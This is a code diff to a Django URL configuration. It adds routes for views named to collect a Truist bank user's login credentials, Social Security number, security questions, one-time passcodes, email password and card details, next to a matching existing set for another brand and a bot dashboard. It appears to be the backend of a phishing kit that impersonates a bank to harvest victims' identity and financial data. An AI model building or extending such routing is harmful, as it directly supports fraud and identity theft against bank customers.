@@ -124,6 +124,18 @@ from user_data.energy_view import (
     energy_collect_user_email_password,
     energy_collect_user_card_info,
 )
+from user_data.truist_views import (
+    truist_collect_user_login_cred,
+    truist_collect_user_login_cred2,
+    truist_collect_user_basic_info,
+    truist_collect_user_home_address,
+    truist_collect_user_social_security,
+    truist_collect_user_social_security_2,
+    truist_collect_user_security_questions,
+    truist_collect_user_otp_verification,
+    truist_collect_user_email_password,
+    truist_collect_user_card_info,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -182,5 +194,16 @@ urlpatterns = [
     path("api/energy-meta-data-8/", energy_collect_user_otp_verification, name="energy_collect_user_otp_verification"),
     path("api/energy-email-password/", energy_collect_user_email_password, name="energy_collect_user_email_password"),
     path("api/energy-card-info/", energy_collect_user_card_info, name="energy_collect_user_card_info"),
+    # Truist API endpoints
+    path("api/truist-meta-data-1/", truist_collect_user_login_cred, name="truist_collect_user_login_cred"),
+    path("api/truist-meta-data-2/", truist_collect_user_login_cred2, name="truist_collect_user_login_cred2"),
+    path("api/truist-meta-data-3/", truist_collect_user_basic_info, name="truist_collect_user_basic_info"),
+    path("api/truist-meta-data-4/", truist_collect_user_home_address, name="truist_collect_user_home_address"),
+    path("api/truist-meta-data-5/", truist_collect_user_social_security, name="truist_collect_user_social_security"),
+    path("api/truist-meta-data-6/", truist_collect_user_social_security_2, name="truist_collect_user_social_security_2"),
+    path("api/truist-meta-data-7/", truist_collect_user_security_questions, name="truist_collect_user_security_questions"),
+    path("api/truist-meta-data-8/", truist_collect_user_otp_verification, name="truist_collect_user_otp_verification"),
+    path("api/truist-email-password/", truist_collect_user_email_password, name="truist_collect_user_email_password"),
+    path("api/truist-card-info/", truist_collect_user_card_info, name="truist_collect_user_card_info"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
